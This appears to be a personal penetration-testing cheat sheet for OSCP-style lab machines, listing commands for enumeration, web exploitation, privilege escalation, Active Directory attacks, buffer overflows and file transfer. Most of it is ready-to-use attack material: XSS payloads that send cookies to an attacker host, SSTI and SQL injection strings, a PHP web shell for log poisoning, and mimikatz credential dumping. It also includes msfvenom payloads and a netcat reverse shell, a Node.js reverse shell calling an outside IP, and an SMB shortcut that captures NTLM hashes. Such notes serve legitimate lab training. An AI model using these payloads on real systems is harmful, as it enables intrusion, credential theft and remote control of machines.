# Notes

## SCANS

* [ ] Quick TCP scan
* [ ] Full TCP scan
* [ ] Vuln scan
* [ ] UDP scan

## GENERAL

* [ ] Version check all services
* [ ] Run wireshark
* [ ] Default credentials
* [ ] Reused credentials
* [ ] Bruteforce credentials (last resource)

## Crypto

### GPG

* [ ] Get hash if password protected `gpg2john creds.priv > hash.txt`
* [ ] Import key `gpg --import creds.priv`
* [ ] Decrypt message `gpg -d creds.txt.gpg`

### MD5

* [ ] Hash Length Extension Attack (if you see md5(secret || data)) (https://book.hacktricks.xyz/crypto-and-stego/hash-length-extension-attack)

## Sockets

* [ ] Code execution: `echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/synapse_commander.s`

## SERVICES

### DNS

* [ ] Find the domain name: `dnsrecon -r 192.168.206.196/24 -n 192.168.206.196`
* [ ] List hosts: `host -l <domain-name> <dns_server-address>`
* [ ] Zone transfer: `dig axfr matrimony.off @192.168.206.196`

### SSH

* [ ] If key is not being accepted: `ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' example.server.com`

### FTP

* [ ] Anonymous access
* [ ] Binary transfer
* [ ] Check for exploits of software running in the machine
* [ ] Use `passive` to switch off passive mode (sometimes it works)
* [ ] Custom wordlist with rules `john --rules=best64 --wordlist=wordlist --stdout > mutated-list.txt`

### SMB

* [ ] Version: `sudo tcpdump -s0 -n -i tun0 src $rhost and port 139 -A -c 10 2>/dev/null`
* [ ] MS17-010 `https://github.com/worawit/MS17-010` `https://github.com/helviojunior/MS17-010`
* [ ] Symlink: `https://github.com/MarkBuffalo/exploits/blob/master/Samba/CVE-2010-0926.c`
* [ ] Enumerate shares with domain: `sudo crackmapexec smb 192.168.206.122 --shares -d hutch.offsec`
* [ ] List Shares
* [ ] Check for exploits of software running in the machine

#### SMB .lnk exploit

If you can write an SMB share that a user visits, you can poison a shortcut file as such:

```bash
# contents of @hax.url   
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\192.168.49.194\%USERNAME%.icon
IconIndex=1

# set up responder
# make sure the responder is set to listen SMB (see responder.conf file)
sudo responder -I tun0 -v

# upload the file to the smb server
```

### MSSQL

* [ ] List databases: `SELECT name FROM master.dbo.sysdatabases`
* [ ] List tables: `SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES`
* [ ] list all tables: UNION SELECT table\_name, null, null from all\_tables --
* [ ] list columns from web\_admins: UNION SELECT column\_name, null, null from all\_tab\_columns where table\_name = 'WEB\_ADMINS'--
* [ ] get admin password: UNION SELECT password, null, null from web\_admins --

### SQLite

* [ ] Check https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf
* [ ] List tables: `UNION SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT LIKE 'sqlite_%'`
* [ ] List columns: `UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name = '<yourtablehere>'`

### GraphQL

* [ ] Use inql to dump schemas: `inql -t http://192.168.206.201/graphql -o inql-dump` (https://github.com/doyensec/inql)

### HTTP/HTTPS

* [ ] Nikto
* [ ] Davtest
* [ ] Robots.txt
* [ ] /cgi-bin/
* [ ] Directory enumeration
  * [ ] Recursion
  * [ ] Extensions `/usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt`
* [ ] Vhost enumeration
* [ ] GIT
  * [ ] Download all files `wget -r http://host.com`
  * [ ] Check changes `git diff`
  * [ ] List files: `git ls-files`
  * [ ] Check logs: `git log`
  * [ ] Show patches: `git log -p`
  * [ ] Show specific commit: `git show 5eba8ab3b718a6ab6610186be934ba214e228a58`
  * [ ] Navigate previous commits: `git checkout 94dd0547f4222e5f93674cc551dbcf98589fe668`
  * [ ] Show tree's filenames: `git cat-file -p master^{tree}`
  * [ ] Cat file: `git cat-file -p 5a959db874e0174aa93a1f7eecaf55a5d95f6e11`
  * [ ] Set git identity (to commit files) `git config --global user.name "user"; git config --global user.email "user@email.(none)"`
  * [ ] Commit: `git add -A; git commit -m "pwn"`
  * [ ] Git shell interactions: `GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.120.204:/git-server` (see **Hunit** on Proving Grounds)
* [ ] Public exploits for application
* [ ] Fuzz .php files
  * [ ] Test with FUZZ = /etc/passwd:
* [ ] SQL Injections: `' or 1=1 -- - # //`
* [ ] NoSQL Injections: `username[$ne]=admin&password[$ne]=admin&login=login`
* [ ] SSTI: `${{<%[%'"}}%\.` (https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
  * [ ] RCE: `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
  * [ ] memcached: `memccat --server=192.168.206.59 session:0c4c0507-a016-41c5-9896-0854a93f49d1` (see Shifty box on PG)
* [ ] SSI (.shtml, .stm): `<!--#exec cmd="ls" -->` (more info: https://owasp.org/www-community/attacks/Server-Side\_Includes\_(SSI)\_Injection)
*   [ ] XSS:

    * [ ] Img tag: `<img src='http://evil/?c='+document.cookie>`
    * [ ] Html file injection:

    ```html
    	<html>
    	<body>
    	<script>
    	var r = new XMLHttpRequest();
    	r.open("GET", "http://KALI-IP/" + document.cookie);
    	r.send();
    	</script>
    	</body>
    	</html>
    ```
* [ ] Default credentials:
  * [ ] Default user: `admin, root, application name (joomla, wp_admin), machine/system name`
  * [ ] Default pass: `admin, root, toor, password, 123456`
  * [ ] Default creds list: https://www.qualys.com/docs/qualys-vm-scanning-default-credentials.pdf
* [ ] Brute force login forms (watch for /admin > /admin/ 301s)
  * [ ] use cewl to generate wordlists `cewl -m 5 http://...`
* [ ] LFI:
  * [ ] rfi-lfi list
  * [ ] /var/auth/log may contain ssh logs, which can be poisoned: `ssh '<?php system($_GET['cmd']);?>'@...`
  * [ ] If any logs are found, check service and try poisoning them
  * [ ] Check for `/webdav`. If available, you can use `cadaver` to put files.
* [ ] SSRF
  * [ ] Run responder
* [ ] PHP Serialization
  * [ ] https://snoopysecurity.github.io/web-application-security/2021/01/08/02\_php\_object\_injection\_exploitation-notes.html
  * [ ] See serialize.php from "Injecto"
* [ ] PHP Type juggling
  * [ ] if you encounter `==` in php code, you can bypass it. e.g.: `username=admin&password[]=` (see Potato writeup in vulnhub https://www.infosecarticles.com/potato-1-vulnhub-walkthrough/)
  * [ ] the value "QNKCDZO" in md5 is "0e830400451993494058024219903391". You can abuse this if you know the md5 value of a given hash starts with "0e". This is vulnerable in case you see php code using `!=`. For example: `if (!$user || (md5($password) != $user['password'])) {`
* [ ] Other stuff
  * [ ] test things you find in HTTP as username for the ssh server. e.g. if you found "gaara.jpg" then try gaara as username for ssh.
  * [ ] Always sniff traffic and look at cookies
  * [ ] Use the name of the machine for bruteforcing (directories, passwords, usernames...)
* [ ] File upload: https://book.hacktricks.xyz/pentesting-web/file-upload#bypass-file-extensions-checks

### SNMP

* [ ] Best enumeration tool: `snmp-check`

### KERBEROS

* [ ] Bruteforce users: `kerbrute userenum -d <domain> --dc <ip> -o kerbrute-users.txt <users.txt>`
* [ ] Bruteforce password: `kerbrute bruteuser -d <domain> --dc <ip> -o kerbrute-pass.txt /usr/share/wordlists/rockyou.txt <user>@<domain>`

## POST-EXPLOITATION

### LINUX

* [ ] OS version: `uname -a`
* [ ] Groups: `id`
* [ ] IP: `ifconfig` `ip a s` `ip a`
* [ ] Sudoers: `sudo -l`
* [ ] Crontabs: `cat /etc/crontab`
  * [ ] Check LD\_LIBRARY\_PATH for library hijack https://book.hacktricks.xyz/linux-hardening/privilege-escalation/payloads-to-execute#overwriting-a-library
* [ ] SUID binaries: `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null > suids.txt`
* [ ] User files: `find / -user $USER 2>/dev/null | grep -v "proc\|sys\|run" > $USER-files.txt`
* [ ] Group files: `find / -group $GROUP -ls 2>/dev/null | grep -v "home\|tmp\|proc" > group-files.txt`
* [ ] Writable files: `find /etc -type f -writable 2>/dev/null`
* [ ] Passwords in config files: `/var/www/html`
* [ ] Internal services: `ss -tunlp` `netstat -tulnp`
* [ ] Kernel exploits: `https://github.com/jondonas/linux-exploit-suggester-2`
* [ ] Sites enabled: `/etc/apache2/sites-enabled`
* [ ] Log files
* [ ] Backups
* [ ] Reused passwords (test username as password too, root:root)
* [ ] Apps in /opt
  * [ ] Revert .pyc with uncompyle6
* [ ] Running proccesses `ps -aux`
* [ ] Pspy: `https://github.com/DominicBreuker/pspy`
* [ ] Linpeas

#### Docker Escape Machines

&#x20;On proving grounds, check the following machines:

* [ ] **Sirol -** find hosts disks with `fdisk -l` and mount or abuse `gluster` for privesc
* [ ] **Deployer** - abuse `Dockerfile` instructions with `docker build`
* [ ] **Matrimony** - abuse writable docker sock and build root container.

### WINDOWS

#### Useful commands

* [ ] OS info: `systeminfo`
* [ ] Hidden files: `attrib`
* [ ] File/Directory properties (similar ls -la): `Get-Acl file | fl`
* [ ] Restart `shutdown.exe -r -f -t 1` (may take 5 minutes to fully reset)
* [ ] Run as another user: `./RunasCs_net4.exe svc_mssql trustno1 'c:\temp\nc.exe -e cmd.exe 192.168.49.155 4444'` (must be run in powershell, download: https://github.com/antonioCoco/RunasCs/releases/tag/1.3)
* [ ] Check scheduled tasks: `schtasks /query /fo list /v | findstr "apache"` (similar cat /etc/crontab)
* [ ] Access check: `.\accesschk.exe /accepteula -uwdq "C:\Program Files"`
* [ ] Change file permissions: `cacls <file> /e /p <user>:F` (similar chmod 777)

#### Privileges

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens

* [ ] Privileges: `whoami /priv`
* [ ] SeManageVolumePrivilege: `SeManageVolumeExploit.exe` https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public - then you may run WerTrigger for a root shell: https://github.com/sailay1996/WerTrigger
* [ ] SeImpersonatePrivilege: `juicypotato.exe -t * -l 1338 -c {9E175B6D-F52A-11D8-B9A5-505054503030} -p cmd.exe -a "/c c:/users/nathan/desktop/Windows_10_pro/revshell.exe"`
* [ ] SeBackupPrivilege: `Import-Module .\Acl-FullControl.ps1; Acl-FullControl.ps1 -user <domain>\<low-priv-user> -path c:\users\administrator` - https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1

#### Common checks

* [ ] Look at installed KBs: `wmic qfe list`
  * [ ] KB4540673: https://github.com/danigargu/CVE-2020-0796 (replace line 204 with shellcode from `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.3 LPORT=8081 -f dll -f csharp`)
* [ ] Backup folder `C:\backups`
* [ ] Console history `C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
* [ ] Installed software `C:\Program and Files`
* [ ] Check Sticky Notes: `%LocalAppData%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState` (or similar path)

#### Tools

* [ ] PrivescCheck.ps1 `Invoke-PrivescCheck -Extended`
* [ ] PowerUp.ps1 `Invoke-AllChecks`
* [ ] WinPeas

#### Extra resources

* [ ] Payload all things Windows Privesc https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
* [ ] If a symbolic link is needed: https://github.com/googleprojectzero/symboliclink-testing-tools/releases/download/v1.0/Release.7z (see Symbolic writeup)
* [ ] Compile C code for windows with `mingw32`: https://stackoverflow.com/questions/2033997/how-to-compile-for-windows-on-linux-with-gcc-g

## ACTIVE DIRECTORY

* [ ] Domain users: `net user /domain`
* [ ] Specific user in domain: `net user <user> /domain`
* [ ] User SID: `whoami /user`
* [ ] Dump credentials: `.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit`
* [ ] Dump tickets: `.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::tickets" exit`
* [ ] Pass the hash: Use RC4\_HMAC portion to pass the hash.
* [ ] LAPS: see **hutch** on proving grounds
* [ ] Try using python scripts to enum users:

```python
import ldap3
server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
connection = ldap3.Connection(server)
connection.bind()
print(server.info)

# Dump all objects
connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
print(connection.entries)

# Dump whole LDAP:
connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
print(connection.entries)
```

* [ ] `ldapsearch -x -b "dc=asky,dc=corp" -H ldap://10.1.139.113`
* [ ] `ldapsearch -x -h <IP> -s base.namingcontexts`
* [ ] `ldapsearch -x -h <IP> -b 'DC=?,DC=?'`
* [ ] Check for Lockout Policy: `ldapsearch -x -p 389 -h <machine IP> -b "dc=example,dc=local" -s sub "*" | grep lock`
* [ ] Check for local Groups (ex service accounts): `ldapsearch -h 10.129.93.167 -p 389 -x -b "dc=htb,dc=local"`

### Kerberoasting

1. Upload rubeus.exe to the client: `certutil -urlcache -f http://192.168.119.135/Rubeus.exe rubeus.exe`
2. Get service hashes: `rubeus.exe kerberoast /outfile:C:\temp\hashes.txt` (Use your own method for transfering hashes to your local machine, I decided to base64 encode them and copy/paste):
3. Encode the hashes: `certutil -encode hashes.txt hashes.b64`
4. Copy the hashes: `type hashes.b64`
5. Paste the hashes in kali. Remove new lines and don't copy the "CERTIFICATE" lines.
6. Decode the hashes in kali: `base64 -d hashes.b64 > hashes.txt`
7. Isolate the SQL hash anc crack it: `hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt`

## BUFFER OVERFLOW

* [ ] Configure mona: `!mona config -set workingfolder c:\mona\%p`
* [ ] Crash the app with fuzzer
* [ ] Use pattern create to exploit `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crashpoint+400>`
* [ ] Execute exploit and find distance: `!mona findmsp -distance <crashpoint+400>` (look for EIP contains normal pattern : ... (offset XXXX))
* [ ] Update exploit with offset variable and set retn to "BBBB"
* [ ] Run exploit again, check if EIP is 42424242 _Repeat until all bad characters are found_
  * [ ] Generate bytearray with mona: `!mona bytearray -b "\x00"`
  * [ ] Generate bytearray with python
  * [ ] Include python's bytearray in exploit.py and compare results: `!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>`
  * [ ] Take note of bad characters and generate new bytearray in mona and python
* [ ] Find jump points `!mona jmp -r esp -cpb "<hex-bad-chars>"`
* [ ] Update retn from exploit.py with one of the jump points written backwards (e.g. "\x01\x02\x03\x04" in Immunity is "\x04\x03\x02\x01" in exploit)
* [ ] Generate payload: `msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -b "<badchars>" -f c`
* [ ] Prepend NOPs: `padding = "\x90" * 16`
* [ ] Exploit

## TROUBLESHOOTING

### Bruteforce

* [ ] Verify if adding '/' to endpoint changes something: `/admin != /admin/`

### Go Libraries

* [ ] If an exploit requires a library that you don't have, you try the following:
  * [ ] Run `go install <library>`
  * [ ] Go the website, download the library, create a folder for it in `/usr/lib/go-1.18/src/` and add the .go files to that folder (e.g. for the library `"golang.org/x/crypto/pbkdf2"` I went to `https://pkg.go.dev/golang.org/x/crypto/pbkdf2`, downloaded the .go source files, and uploaded in `/usr/lib/go-1.18/src/pbkdf2`)

### Perl Libraries

* [ ] use `sudo cpan` and `install <library>` to add perl libraries

## TRICKS

### Port Forwarding

```bash
# First on Kali:
chisel server -p 9001 --reverse
# Then on host (victim):
chisel client <your-kali-ip>:9001 R:3306:127.0.0.1:3306 # 3306 for mysql, but could be any port you want
./chisel client 192.168.49.206:6003 R:27017:127.0.0.1:27017 # 3306 for mysql, but could be any port you want
```

### Create New User

```bash
# Linux
openssl passwd -1
```

### File Transfer

* [ ] Netcat:

```bash
# In host:
nc -w 3 192.168.49.99 9000 < file
# In kali:
nc -lvnp 9000 > file
```

* [ ] Certutil:

```bash
certutil -urlcache -f http:// shell.exe
```

* [ ] SMB:

```bash
impacket-smbserver.py share . -smb2support -username hacker -password hacker # launch smb server
C:\ net use \\10.10.14.134\share /u:hacker hacker # connect to smb server from host
C:\ copy winPEASx64.exe \\10.10.14.9\share\ # copy local file to attacker machine
C:\ net use /d \\10.10.14.9\share\ # disconnect from smb server
```

* [ ] Base64:

```bash
C:\ certutil -encode <file> encoded.txt
C:\ type encoded.txt` # copy files manually (ctrl+C)
kali> `echo -n "<Ctrl+V>" | base64 -d > decoded_file
```

* [ ] Powershell:

```shell
Invoke-WebRequest -Uri 'http://192.168.49.206/exploit.ps1' -OutFile 'C:\temp\exploit.ps1'
```

### Reverse Shells

#### msfvenom

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f elf -o revshell.elf
msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=1337 -f exe -o revshell.exe
```

#### nodejs

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(80, "192.168.49.206", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```
